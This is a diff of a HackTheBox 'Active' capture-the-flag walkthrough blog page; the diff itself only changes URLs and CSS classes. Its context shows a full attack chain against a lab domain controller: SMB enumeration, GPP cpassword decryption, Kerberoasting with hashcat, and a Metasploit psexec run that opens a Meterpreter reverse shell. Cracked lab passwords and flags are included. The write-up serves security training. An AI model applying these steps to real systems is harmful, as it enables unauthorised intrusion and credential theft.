@@ -42,11 +42,11 @@
   
   <!-- Facebook OGP cards -->
   <meta property="og:description" content="This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement -p-..." />
-  <meta property="og:url" content="http://snoopysecurity.github.io" />
+  <meta property="og:url" content="http://localhost:4000" />
   <meta property="og:site_name" content="💻 | Blog" />
   <meta property="og:title" content="HackTheBox : Active Walkthrough" />
   <meta property="og:type" content="website" />
-  <meta property="og:image" content="http://snoopysecurity.github.io/assets/htb/banner.png" />
+  <meta property="og:image" content="http://localhost:4000/assets/htb/banner.png" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="612" />
   <meta property="og:image:height" content="605" />
@@ -57,16 +57,16 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="HackTheBox : Active Walkthrough">
   <meta name="twitter:description" content="This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement -p-...">
-  <meta name="twitter:image" content="http://snoopysecurity.github.io/assets/htb/banner.png">
-  <meta name="twitter:url" content="http://snoopysecurity.github.io">
+  <meta name="twitter:image" content="http://localhost:4000/assets/htb/banner.png">
+  <meta name="twitter:url" content="http://localhost:4000">
   
 
   
 
   <!-- Site styles -->
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://snoopysecurity.github.io/capture-the-flag/2018/12/28/htb-active-walkthrough.html">
-  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://snoopysecurity.github.io/feed.xml" />
+  <link rel="canonical" href="http://localhost:4000/capture-the-flag/2018/12/28/htb-active-walkthrough.html">
+  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
 </head>
 
 
@@ -143,9 +143,9 @@
 </section>
 
 <article class="post-content">
-  <p>This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement <code class="highlighter-rouge">-p-</code> can also be used to scan the entire port range upto 65536</p>
+  <p>This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement <code class="language-plaintext highlighter-rouge">-p-</code> can also be used to scan the entire port range upto 65536</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# nmap -sV 10.10.10.100 -n -sC -Pn -vvv
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# nmap -sV 10.10.10.100 -n -sC -Pn -vvv
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-21 16:23 EDT
 NSE: Loaded 148 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -206,8 +206,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 214.99 seconds
            Raw packets sent: 1344 (59.136KB) | Rcvd: 1001 (40.108KB)
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Looking at the provided LDAP information, it can be deduced that DNS name for this machine is active.htb. This can be added to your hosts file. It is also obvious that by the services open such as DNS, LDAP and Kerberos, this is a domain controller</p>
 
@@ -215,7 +214,7 @@ Nmap done: 1 IP address (1 host up) scanned in 214.99 seconds
 
 <p>Since LDAP is open, enumeration can be conduced on this service.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# nmap -p 389 --script ldap-rootdse active.htb
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# nmap -p 389 --script ldap-rootdse active.htb
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-22 16:58 EDT
 Nmap scan report for active.htb (10.10.10.100)
 Host is up (0.057s latency).
@@ -303,14 +302,13 @@ PORT    STATE SERVICE
 |       forestFunctionality: 4
 |_      domainControllerFunctionality: 4
 Service Info: Host: DC; OS: Windows 2008 R2
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Root Directory Server Agent Service Entry or RootDSE is usually provided LDAP servers and they must provide information about itself and other information that is specific to each server.</p>
 
 <p>The ldap-brute script can also be used to conduct brute force attacks on the server using LDAP, however this can be dangeorus and could lock out valid accounts. If Anonymous Bind is enabled , we could conduct ldap search queries to try searching for the base. However, it looks like that is not possible.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# ldapsearch -h 10.10.10.100 -p 389 -x -b "dc=active,dc=htb"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# ldapsearch -h 10.10.10.100 -p 389 -x -b "dc=active,dc=htb"
 # extended LDIF
 #
 # LDAPv3
@@ -326,14 +324,13 @@ text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
  tion a successful bind must be completed on the connection., data 0, v1db1
 
 # numResponses: 1
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="smb-enumeration">SMB Enumeration</h3>
 
 <p>Since SMB is open, enum4linux can be used to conduct information on that service.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# enum4linux 10.10.10.100
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# enum4linux 10.10.10.100
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun 22 17:23:52 2019
 
  ========================== 
@@ -487,13 +484,12 @@ error: NT_STATUS_ACCESS_DENIED
 
 
 enum4linux complete on Sat Jun 22 17:24:30 2019
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<p>Looking at enum4linux output, the Replication share (//10.10.10.100/Replication) seems to be accessible. SMBClient (<code class="highlighter-rouge">smbclient -L 10.10.10.100</code>) can also be used to confirm this.</p>
+<p>Looking at enum4linux output, the Replication share (//10.10.10.100/Replication) seems to be accessible. SMBClient (<code class="language-plaintext highlighter-rouge">smbclient -L 10.10.10.100</code>) can also be used to confirm this.</p>
 
 <p>By enumerating this share using smbmap, the following can be seen:</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# smbmap -R Replication -H 10.10.10.100 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# smbmap -R Replication -H 10.10.10.100 
 [+] Finding open SMB ports....
 [+] User SMB session establishd on 10.10.10.100...
 [+] IP: 10.10.10.100:445	Name: active.htb                                        
@@ -565,30 +561,27 @@ enum4linux complete on Sat Jun 22 17:24:30 2019
 	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
 	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
 	.\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<p>It seems that that Groups.xml file is accessible. In older versions of Windows servers (pre 2012), Groups.xml can be used by system administrator to create local administators within a domain using a domain controller. This file can be fetched using <code class="highlighter-rouge">smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q</code>.</p>
+<p>It seems that that Groups.xml file is accessible. In older versions of Windows servers (pre 2012), Groups.xml can be used by system administrator to create local administators within a domain using a domain controller. This file can be fetched using <code class="language-plaintext highlighter-rouge">smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q</code>.</p>
 
 <p>Looking at the obtained Groups.xml file, the important sections in the groups.xml file are the username and cpassword.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
-<span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;&lt;User</span> <span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="na">name=</span><span class="s">"active.htb\SVC_TGS"</span> <span class="na">image=</span><span class="s">"2"</span> <span class="na">changed=</span><span class="s">"2018-07-18 20:46:06"</span> <span class="na">uid=</span><span class="s">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="nt">&gt;&lt;Properties</span> <span class="na">action=</span><span class="s">"U"</span> <span class="na">newName=</span><span class="s">""</span> <span class="na">fullName=</span><span class="s">""</span> <span class="na">description=</span><span class="s">""</span> <span class="na">cpassword=</span><span class="s">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="na">changeLogon=</span><span class="s">"0"</span> <span class="na">noChange=</span><span class="s">"1"</span> <span class="na">neverExpires=</span><span class="s">"1"</span> <span class="na">acctDisabled=</span><span class="s">"0"</span> <span class="na">userName=</span><span class="s">"active.htb\SVC_TGS"</span><span class="nt">/&gt;&lt;/User&gt;</span>
-<span class="nt">&lt;/Groups&gt;</span>
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre></div></div>
 
 <p>gpp-decrypt can be used to get the plaintext value of the recovered cpassword.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 /usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
 GPPstillStandingStrong2k18
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Using metasploit’s SMB Login module, these credentials can be used to double check access.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf5 auxiliary(scanner/smb/smb_login) &gt; run
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 auxiliary(scanner/smb/smb_login) &gt; run
 
 [*] 10.10.10.100:445      - 10.10.10.100:445 - Starting SMB login bruteforce
 [+] 10.10.10.100:445      - 10.10.10.100:445 - Success: 'active.htb\SVC_TGS:GPPstillStandingStrong2k18'
@@ -596,21 +589,19 @@ GPPstillStandingStrong2k18
 [*] 10.10.10.100:445      - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf5 auxiliary(scanner/smb/smb_login) &gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>However, it looks like this user doesn’t have administrator privileges so psexec is not possible.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>[*] Started reverse TCP handler on 10.10.14.9:4444 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Started reverse TCP handler on 10.10.14.9:4444 
 [*] 10.10.10.100:445 - Connecting to the server...
 [*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'SVC_TGS'...
 [-] 10.10.10.100:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
 [*] Exploit completed, but no session was created.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Enumeration the shares again using smbmap, the users share seems to be accessible</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
 [+] Finding open SMB ports....
 [+] User SMB session establishd on 10.10.10.100...
 [+] IP: 10.10.10.100:445	Name: active.htb                                        
@@ -623,12 +614,11 @@ msf5 auxiliary(scanner/smb/smb_login) &gt;
 	Replication                                       	READ ONLY
 	SYSVOL                                            	READ ONLY
 	Users                                             	READ ONLY
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Enumeration of the SVC_TGS user directories revealed that the user.txt is stored within the user’s desktop.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r Users\\SVC_TGS\\Desktop
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r Users\\SVC_TGS\\Desktop
 [+] Finding open SMB ports....
 [+] User SMB session establishd on 10.10.10.100...
 [+] IP: 10.10.10.100:445	Name: active.htb                                        
@@ -639,10 +629,9 @@ msf5 auxiliary(scanner/smb/smb_login) &gt;
 	dr--r--r--                0 Sat Jul 21 11:14:42 2018	.
 	dr--r--r--                0 Sat Jul 21 11:14:42 2018	..
 	fr--r--r--               34 Sat Jul 21 11:14:42 2018	user.txt
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<p>This can be fetched to get the user token for this machine: <code class="highlighter-rouge">smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q</code></p>
+<p>This can be fetched to get the user token for this machine: <code class="language-plaintext highlighter-rouge">smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q</code></p>
 
 <h3 id="bloodhound">BloodHound</h3>
 
@@ -653,11 +642,11 @@ msf5 auxiliary(scanner/smb/smb_login) &gt;
   <li>https://thenoobsway.com/active-directory-reconnaissance-using-bloodhound/</li>
 </ul>
 
-<p>Since we have low privilege credentials, we could authenticate via LDAP and <code class="highlighter-rouge">ad-ldap-enum</code> or <code class="highlighter-rouge">ldapdomaindump</code> to look for interesting information. However, BloodHound is a better tool for this proces. Since we can’t psexec due to  <code class="highlighter-rouge">svc_tgs</code> being a service account, runas can been used to start a shell as a low priv user. The following command can be used: <code class="highlighter-rouge">runas /netonly /user:active.htb\svc_tgs cmd</code></p>
+<p>Since we have low privilege credentials, we could authenticate via LDAP and <code class="language-plaintext highlighter-rouge">ad-ldap-enum</code> or <code class="language-plaintext highlighter-rouge">ldapdomaindump</code> to look for interesting information. However, BloodHound is a better tool for this proces. Since we can’t psexec due to  <code class="language-plaintext highlighter-rouge">svc_tgs</code> being a service account, runas can been used to start a shell as a low priv user. The following command can be used: <code class="language-plaintext highlighter-rouge">runas /netonly /user:active.htb\svc_tgs cmd</code></p>
 
 <p><img src="/assets/htb/1.png" alt="alt text" title="1" /></p>
 
-<p>Once that is completed, The BloodHound C# Ingestor “SharpHound” can be used to enumerate LDAP and gather all domain information: <code class="highlighter-rouge">.\SharpHound.exe -c all -d active.htb --DomainController</code>. You will need to ensure that your DNS server configuration on your windows machine is pointing to 10.10.10.100.</p>
+<p>Once that is completed, The BloodHound C# Ingestor “SharpHound” can be used to enumerate LDAP and gather all domain information: <code class="language-plaintext highlighter-rouge">.\SharpHound.exe -c all -d active.htb --DomainController</code>. You will need to ensure that your DNS server configuration on your windows machine is pointing to 10.10.10.100.</p>
 
 <p><img src="/assets/htb/2.png" alt="alt text" title="2" /></p>
 
@@ -669,13 +658,13 @@ msf5 auxiliary(scanner/smb/smb_login) &gt;
 
 <p><img src="/assets/htb/4.png" alt="alt text" title="4" /></p>
 
-<p>Impacket’s GetUserSPNs.py script can be used to request the TGS of the administrator account and extract the hash of this for offline cracking. This can be achieved using Hashcat: <code class="highlighter-rouge">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable</code></p>
+<p>Impacket’s GetUserSPNs.py script can be used to request the TGS of the administrator account and extract the hash of this for offline cracking. This can be achieved using Hashcat: <code class="language-plaintext highlighter-rouge">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable</code></p>
 
 <p><img src="/assets/htb/5.png" alt="alt text" title="5" /></p>
 
 <p>Hashcat successfully cracked the hash using the rockyou.txt wordlist and the plaintext password of this hash can be seen below.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$373e34da642ae2f6fc55a66510e68ee7$9346f3dc8da4fa6b12e3fb663847fb755d729d12d55ca78f341056fd3d38845da008f17f0c08f35f13abd24bd51f4feb9febdcc1c2aa369f4c7d6ad42ce554570a45a933fdbc3f9d2f27be5c954cecd409863258da13af592cfa1765ab5b50fc566bcb4a68b1a00fce1a68d65b4d89a5ff93d1116744567370c052c1945dde973cbf610d5b257643fe4539b7f17d26b907aac87c9a4c493e8793c46eb6b1f8fdee32748261a17ecb6528ca343086109d515b731cc7cd020834df4bad5c47ff041995b4aaec1ca3a1063d47ceed63004ad25b824daff040539290567186632e7c611ee9a5519551d5968b077b944ee965d4de78927abe3bdfbd8b5d9061430904934d1fe44edf03100f63e64888a3268eb6c0ef66ef406dee14aa90ac0c8679ea7948ca2a9c5909aa054487be237017ad8dcf2c483bd750a35b67c813ef7998cde315d13d8429807c452dc865f134a2ba5a214f07594712f141a7f5af48d145e54d5e4c09d5942a29386f33a4773e3aa5dc3fa4fb271ee81e7daa3340339a44f2725a758cec4f7748727f7b018cab8dde4fbcefcbfab225d4ef910d863b6a4e37e039e0aff33825fd40be982e13946ee645ff72778fbe3c5fe10b695efb31bfca097afff3e1e0e8421fbd49334bab43017761293a2433b45aefc67f4abf809e0e3075b619f6b1e309924b6ae007632d9000c88038d547881787f5609398c810ca0a2d279a149df82759ddc59648a663ad8f764b45b915d170bf457f20e14a621f7ee4032bca48e9a0e2a2d6aa477e3e0375b7f4a2418aa0f6f5e06a2e2a307667eec40b6999fa6529a233f90092171ee09de00e6cc3b6f17f0a620c981bff474fed62d1f4211bce51fe28cae747ebaac12de512437aef20a05457051adec6ec65e649a570671360b107b3330b479af227910f9074f1abb26f7602a1821cff3b044c754909c8fbe164f69254bbcc8e6c2d026f9e973e364f7ad53b6b22c33a4fb1e8b7b8a5948133471172f9d4e01580b16105ee277a8136935f6be751753b1c8ea0bcd6b5d503884db5364b7485e4294935fc2129867b7918d17a56a4dacbda7f77f0dca04b1d6ccd0b5ded7f43f5721c9b22e37d07cea1c01caedf3a4324a7058452204baedf85d48cab02aeffc905aa054864fd128f2ca456d86ab0c97698df3fc3058233c95428d9c7ac54ed5aa603a4f21944576241f970ddd594d880372500bcffd677bde516ee75d18463dae717cef842de7bf7d9c03146:Ticketmaster1968
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$373e34da642ae2f6fc55a66510e68ee7$9346f3dc8da4fa6b12e3fb663847fb755d729d12d55ca78f341056fd3d38845da008f17f0c08f35f13abd24bd51f4feb9febdcc1c2aa369f4c7d6ad42ce554570a45a933fdbc3f9d2f27be5c954cecd409863258da13af592cfa1765ab5b50fc566bcb4a68b1a00fce1a68d65b4d89a5ff93d1116744567370c052c1945dde973cbf610d5b257643fe4539b7f17d26b907aac87c9a4c493e8793c46eb6b1f8fdee32748261a17ecb6528ca343086109d515b731cc7cd020834df4bad5c47ff041995b4aaec1ca3a1063d47ceed63004ad25b824daff040539290567186632e7c611ee9a5519551d5968b077b944ee965d4de78927abe3bdfbd8b5d9061430904934d1fe44edf03100f63e64888a3268eb6c0ef66ef406dee14aa90ac0c8679ea7948ca2a9c5909aa054487be237017ad8dcf2c483bd750a35b67c813ef7998cde315d13d8429807c452dc865f134a2ba5a214f07594712f141a7f5af48d145e54d5e4c09d5942a29386f33a4773e3aa5dc3fa4fb271ee81e7daa3340339a44f2725a758cec4f7748727f7b018cab8dde4fbcefcbfab225d4ef910d863b6a4e37e039e0aff33825fd40be982e13946ee645ff72778fbe3c5fe10b695efb31bfca097afff3e1e0e8421fbd49334bab43017761293a2433b45aefc67f4abf809e0e3075b619f6b1e309924b6ae007632d9000c88038d547881787f5609398c810ca0a2d279a149df82759ddc59648a663ad8f764b45b915d170bf457f20e14a621f7ee4032bca48e9a0e2a2d6aa477e3e0375b7f4a2418aa0f6f5e06a2e2a307667eec40b6999fa6529a233f90092171ee09de00e6cc3b6f17f0a620c981bff474fed62d1f4211bce51fe28cae747ebaac12de512437aef20a05457051adec6ec65e649a570671360b107b3330b479af227910f9074f1abb26f7602a1821cff3b044c754909c8fbe164f69254bbcc8e6c2d026f9e973e364f7ad53b6b22c33a4fb1e8b7b8a5948133471172f9d4e01580b16105ee277a8136935f6be751753b1c8ea0bcd6b5d503884db5364b7485e4294935fc2129867b7918d17a56a4dacbda7f77f0dca04b1d6ccd0b5ded7f43f5721c9b22e37d07cea1c01caedf3a4324a7058452204baedf85d48cab02aeffc905aa054864fd128f2ca456d86ab0c97698df3fc3058233c95428d9c7ac54ed5aa603a4f21944576241f970ddd594d880372500bcffd677bde516ee75d18463dae717cef842de7bf7d9c03146:Ticketmaster1968
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -695,12 +684,11 @@ Candidates.#1....: Tioncurtis23 -&gt; Thelittlemermaid
 
 Started: Thu Jul  4 19:55:09 2019
 Stopped: Thu Jul  4 19:55:46 2019
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<p>Using the password <code class="highlighter-rouge">Ticketmaster1968</code>, psexec can be used to login to the system and get root.txt. <code class="highlighter-rouge">wmiexec</code> from impacket and <code class="highlighter-rouge">pth-wmis</code> can also be used instead of MetaSploit psexec.</p>
+<p>Using the password <code class="language-plaintext highlighter-rouge">Ticketmaster1968</code>, psexec can be used to login to the system and get root.txt. <code class="language-plaintext highlighter-rouge">wmiexec</code> from impacket and <code class="language-plaintext highlighter-rouge">pth-wmis</code> can also be used instead of MetaSploit psexec.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf5 &gt; use exploit/windows/smb/psexec
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; use exploit/windows/smb/psexec
 msf5 exploit(windows/smb/psexec) &gt; set RHOSTS 10.10.10.100
 RHOSTS =&gt; 10.10.10.100
 msf5 exploit(windows/smb/psexec) &gt; set SMBDomain active.htb
@@ -719,18 +707,16 @@ msf5 exploit(windows/smb/psexec) &gt; run
 [+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...
 [*] Sending stage (179779 bytes) to 10.10.10.100
 [*] Meterpreter session 1 opened (10.10.14.41:4444 -&gt; 10.10.10.100:57298) at 2019-07-04 20:15:59 -0400
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>The root hash can be found within the Administrator’s desktop.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;type root.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;type root.txt
 type root.txt
 b5fc76d1d6b91d77b2fbf2d54d0f708b
 
 C:\Users\Administrator\Desktop&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 </article>
 
@@ -747,7 +733,7 @@ C:\Users\Administrator\Desktop&gt;
   
     
     
-      <a href="//twitter.com/share?text=HackTheBox+%3A+Active+Walkthrough&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html&via=snoopysecurity"
+      <a href="//twitter.com/share?text=HackTheBox+%3A+Active+Walkthrough&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html&via=snoopysecurity"
         onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
         <i class="fa fa-twitter-square fa-lg"></i>
       </a>
@@ -762,7 +748,7 @@ C:\Users\Administrator\Desktop&gt;
     
     
     
-      <a href="//www.facebook.com/sharer.php?t=HackTheBox+%3A+Active+Walkthrough&u=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html"
+      <a href="//www.facebook.com/sharer.php?t=HackTheBox+%3A+Active+Walkthrough&u=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html"
         onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
         <i class="fa fa-facebook-square fa-lg"></i>
       </a>
@@ -787,7 +773,7 @@ C:\Users\Administrator\Desktop&gt;
     
     
     
-      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html"
+      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html"
         onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
         <i class="fa fa-linkedin-square fa-lg"></i>
       </a>
@@ -829,7 +815,7 @@ C:\Users\Administrator\Desktop&gt;
     
     
     
-      <a href="//www.pinterest.com/pin/create/button/?description=HackTheBox+%3A+Active+Walkthrough&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html&media=http://snoopysecurity.github.io/assets/htb/banner.png"
+      <a href="//www.pinterest.com/pin/create/button/?description=HackTheBox+%3A+Active+Walkthrough&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2018%2F12%2F28%2Fhtb-active-walkthrough.html&media=http://localhost:4000/assets/htb/banner.png"
         onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
         <i class="fa fa-pinterest-square fa-lg"></i>
       </a>
